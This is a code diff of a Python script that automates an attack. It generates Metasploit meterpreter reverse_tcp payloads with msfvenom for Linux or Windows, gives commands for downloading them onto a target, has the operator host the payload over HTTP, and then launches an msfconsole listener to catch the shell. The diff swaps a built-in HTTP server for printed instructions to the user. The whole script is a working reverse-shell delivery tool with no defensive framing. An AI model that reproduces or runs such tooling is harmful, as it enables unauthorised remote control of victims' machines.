@@ -1,13 +1,9 @@
 import subprocess
 import re
-import threading
-import http.server
-import socketserver
 import socket
 import sys
 import os
 import tempfile
-import select
 import time
 
 # ---------- Helpers ----------
@@ -41,6 +37,14 @@ def find_free_port(start):
             return p
         p += 1
     return None
+
+def wait_for_port_free(port, timeout=10.0):
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        if not port_in_use(port):
+            return True
+        time.sleep(0.25)
+    return False
 
 # ---------- LHOST ----------
 lhost = input("lhost: ").strip()
@@ -111,42 +115,28 @@ print(f"[*] Using outfile: {outfile}")
 PAYLOAD = None
 if os_env == 0:
     PAYLOAD = "linux/x64/meterpreter_reverse_tcp"
-    cmd = [
-        "msfvenom",
-        "-p", PAYLOAD,
-        f"LHOST={lhost}",
-        f"LPORT={lport}",
-        "-f", "elf",
-        "-o", outfile,
-    ]
-    print(f"[*] Running: {' '.join(cmd)}")
-    try:
-        ret = subprocess.run(cmd, check=False)
-        if ret.returncode != 0:
-            print(f"[!] msfvenom exited with code {ret.returncode}")
-            sys.exit(1)
-    except FileNotFoundError:
-        print("[!] msfvenom not found in PATH.")
-        sys.exit(1)
-elif os_env == 1:
+    fmt = "elf"
+else:
     PAYLOAD = "windows/x64/meterpreter/reverse_tcp"
-    cmd = [
-        "msfvenom",
-        "-p", PAYLOAD,
-        f"LHOST={lhost}",
-        f"LPORT={lport}",
-        "-f", "exe",
-        "-o", outfile,
-    ]
-    print(f"[*] Running: {' '.join(cmd)}")
-    try:
-        ret = subprocess.run(cmd, check=False)
-        if ret.returncode != 0:
-            print(f"[!] msfvenom exited with code {ret.returncode}")
-            sys.exit(1)
-    except FileNotFoundError:
-        print("[!] msfvenom not found in PATH.")
+    fmt = "exe"
+
+cmd = [
+    "msfvenom",
+    "-p", PAYLOAD,
+    f"LHOST={lhost}",
+    f"LPORT={lport}",
+    "-f", fmt,
+    "-o", outfile,
+]
+print(f"[*] Running: {' '.join(cmd)}")
+try:
+    ret = subprocess.run(cmd, check=False)
+    if ret.returncode != 0:
+        print(f"[!] msfvenom exited with code {ret.returncode}")
         sys.exit(1)
+except FileNotFoundError:
+    print("[!] msfvenom not found in PATH.")
+    sys.exit(1)
 
 if not os.path.isfile(outfile):
     print(f"[!] Payload file '{outfile}' was not created. Aborting.")
@@ -173,70 +163,6 @@ print(f"1. {download_cmd}")
 print(f"2. {curl_cmd}")
 print(f"3. {py_cmd}")
 
-# ---------- HTTP server ----------
-get_hit        = threading.Event()
-shutdown_event = threading.Event()
-server_ready   = threading.Event()
-server_error   = {"msg": None}
-httpd_ref      = {"obj": None}    # <-- shared handle for stop_server()
-
-class Handler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        get_hit.set()
-        super().do_GET()
-    def log_message(self, fmt, *args):
-        pass
-
-def start_server():
-    try:
-        socketserver.TCPServer.allow_reuse_address = True
-        httpd = socketserver.TCPServer(("0.0.0.0", lport), Handler)
-        httpd.timeout = 0.25
-        httpd_ref["obj"] = httpd
-        server_ready.set()
-        while not shutdown_event.is_set():
-            httpd.handle_request()
-    except OSError as e:
-        server_error["msg"] = str(e)
-        server_ready.set()
-    finally:
-        if httpd_ref["obj"] is not None:
-            try:
-                httpd_ref["obj"].server_close()
-            except Exception:
-                pass
-
-server_thread = threading.Thread(target=start_server, daemon=True)
-server_thread.start()
-
-server_ready.wait(timeout=3)
-if server_error["msg"]:
-    print(f"[!] Failed to start HTTP server: {server_error['msg']}")
-    sys.exit(1)
-if not server_thread.is_alive():
-    print("[!] HTTP server thread died unexpectedly.")
-    sys.exit(1)
-
-print(f"[*] Python HTTP server started on 0.0.0.0:{lport}")
-
-def stop_server():
-    # 1. Signal the loop to exit
-    shutdown_event.set()
-    # 2. Explicitly close the listening socket — this is what frees the port
-    if httpd_ref["obj"] is not None:
-        try:
-            httpd_ref["obj"].server_close()
-        except Exception:
-            pass
-    # 3. Join the thread (it will exit promptly now)
-    server_thread.join(timeout=3)
-    # 4. Confirm port is free
-    for _ in range(30):
-        if not port_in_use(lport):
-            return True
-        time.sleep(0.1)
-    return False
-
 # ---------- Clipboard ----------
 def copy_to_clipboard(text):
     for cmd in (["xclip", "-selection", "clipboard"],
@@ -255,7 +181,6 @@ while chosen_cmd is None:
     try:
         copy_choice = input("choice: ").strip()
     except EOFError:
-        stop_server()
         sys.exit(0)
 
     if copy_choice == "":
@@ -268,30 +193,28 @@ while chosen_cmd is None:
         print("[!] Invalid choice. Press enter for default.")
 
 copy_to_clipboard(chosen_cmd)
-print("chosen, now hit the target...")
 
-# ---------- Wait: GET OR Enter (whichever first). NO second Enter. ----------
-print("[*] Waiting for GET request from target... (or press Enter to start msfconsole now)")
-try:
-    while True:
-        if get_hit.wait(timeout=0.25):
-            print("[*] GET request detected. Proceeding to msfconsole.")
-            break
-        if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
-            sys.stdin.readline()
-            print("[*] Enter pressed. Proceeding to msfconsole.")
-            break
-except KeyboardInterrupt:
-    stop_server()
-    print("\n[*] Interrupted. Exiting.")
-    sys.exit(0)
+# ---------- User-hosted server instructions ----------
+print()
+print("=" * 60)
+print("[*] Start your own HTTP server in another terminal to host the payload.")
+print(f"[*] Example (run from the directory containing '{outfile}'):")
+print(f"      python3 -m http.server {lport} --bind 0.0.0.0")
+print()
+print("[*] Then run the copied download command on the target.")
+print("[*] When the target has downloaded the payload, stop your HTTP server")
+print(f"    (Ctrl+C in that terminal) so port {lport} is free for msfconsole.")
+print("=" * 60)
 
-# ---------- Tear down HTTP server BEFORE msfconsole binds ----------
-print(f"[*] Stopping HTTP server on port {lport}...")
-if stop_server():
-    print(f"[*] Port {lport} released.")
+input("[*] Press Enter when you have stopped your HTTP server and are ready for msfconsole... ")
+
+# ---------- Wait for port to actually be free ----------
+print(f"[*] Waiting for port {lport} to be free...")
+if not wait_for_port_free(lport, timeout=15):
+    print(f"[!] Port {lport} still appears in use. msfconsole may fail to bind.")
+    input("[*] Press Enter to continue anyway, or Ctrl+C to abort... ")
 else:
-    print(f"[!] Port {lport} still appears in use; msfconsole may fail to bind.")
+    print(f"[*] Port {lport} is free.")
 
 # ---------- msfconsole handler ----------
 def launch_msfconsole():
